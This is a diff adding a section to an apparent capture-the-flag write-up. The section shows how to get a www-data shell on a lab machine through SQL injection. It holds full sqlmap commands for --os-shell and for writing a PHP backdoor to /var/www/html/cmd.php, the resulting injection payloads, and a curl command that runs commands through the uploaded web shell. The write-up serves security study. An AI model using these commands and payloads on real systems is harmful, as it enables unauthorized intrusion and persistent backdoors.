@@ -604,3 +604,134 @@ total 16
 cat /root/root.txt
 d41d8cd98f00b204e9800998ecf84271
 {% endhighlight %}
+
+### 4. Another way to get www-data shell
+
+We have SQL injection here.<br>
+For this machine, we can use it to achieve a user shell.<br>
+
+#### 4.1 --os-shell way
+
+A way that we use SQLmap with "--os-shell" parameter
+{% highlight shell %}
+root@kali:~# sqlmap -u http://10.10.10.143/room.php?cod=1 --random-agent --os-shell
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.3.10#stable}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:22:26 /2019-11-10/
+
+[19:22:26] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.1 Safari/532.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[19:22:26] [INFO] resuming back-end DBMS 'mysql' 
+[19:22:26] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=1 AND 3862=3862
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cod=1 AND (SELECT 6380 FROM (SELECT(SLEEP(5)))sIAL)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: cod=-3382 UNION ALL SELECT NULL,CONCAT(0x7176767871,0x724a4941577351594f52566f7673496e674b42744c4354476f78444c555252715565706d504c6474,0x7178717171),NULL,NULL,NULL,NULL,NULL-- AKaz
+---
+[19:22:26] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9.0 (stretch)
+web application technology: PHP, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.12
+[19:22:26] [INFO] going to use a web backdoor for command prompt
+[19:22:26] [INFO] fingerprinting the back-end DBMS operating system
+[19:22:26] [INFO] the back-end DBMS operating system is Linux
+which web application language does the web server support?
+[1] ASP
+[2] ASPX
+[3] JSP
+[4] PHP (default)
+[19:22:28] [WARNING] unable to automatically retrieve the web server document root
+what do you want to use for writable directory?
+[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
+[2] custom location(s)
+[3] custom directory list file
+[4] brute force search
+[19:22:29] [INFO] retrieved web server absolute paths: '/images/'
+[19:22:29] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
+[19:22:29] [WARNING] unable to upload the file stager on '/var/www/'
+[19:22:29] [INFO] trying to upload the file stager on '/var/www/' via UNION method
+[19:22:29] [WARNING] expect junk characters inside the file as a leftover from UNION query
+[19:22:29] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
+[19:22:30] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
+[19:22:30] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpusmti.php
+[19:22:30] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpbescf.php
+[19:22:30] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
+os-shell> id
+do you want to retrieve the command standard output? [Y/n/a] Y
+command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
+os-shell> 
+{% endhighlight %}
+
+#### 4.2 --file-write way
+
+A way that we use "--file-write" option of SQLmap.<br>
+Upload a webshell and manually run commands by forging http requests.
+{% highlight shell %}
+root@kali:~# sqlmap -u http://10.10.10.143/room.php?cod=1 --random-agent --file-write /usr/share/webshells/php/simple-backdoor.php --file-dest /var/www/html/cmd.php
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.3.10#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:28:11 /2019-11-10/
+
+[19:28:11] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
+[19:28:11] [INFO] resuming back-end DBMS 'mysql' 
+[19:28:11] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=1 AND 3862=3862
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cod=1 AND (SELECT 6380 FROM (SELECT(SLEEP(5)))sIAL)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: cod=-3382 UNION ALL SELECT NULL,CONCAT(0x7176767871,0x724a4941577351594f52566f7673496e674b42744c4354476f78444c555252715565706d504c6474,0x7178717171),NULL,NULL,NULL,NULL,NULL-- AKaz
+---
+[19:28:11] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9.0 (stretch)
+web application technology: PHP, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.12
+[19:28:11] [INFO] fingerprinting the back-end DBMS operating system
+[19:28:11] [INFO] the back-end DBMS operating system is Linux
+[19:28:11] [WARNING] expect junk characters inside the file as a leftover from UNION query
+do you want confirmation that the local file '/usr/share/webshells/php/simple-backdoor.php' has been successfully written on the back-end DBMS file system ('/var/www/html/cmd.php')? [Y/n] Y
+[19:28:18] [INFO] the remote file '/var/www/html/cmd.php' is larger (334 B) than the local file '/usr/share/webshells/php/simple-backdoor.php' (328B)
+[19:28:18] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.143'
+
+[*] ending @ 19:28:18 /2019-11-10/
+
+root@kali:~#
+{% endhighlight%}
+{% highlight shell %}
+root@kali:~# curl 'http://10.10.10.143/cmd.php?cmd=id'
+<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
+
+<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
+{% endhighlight %}
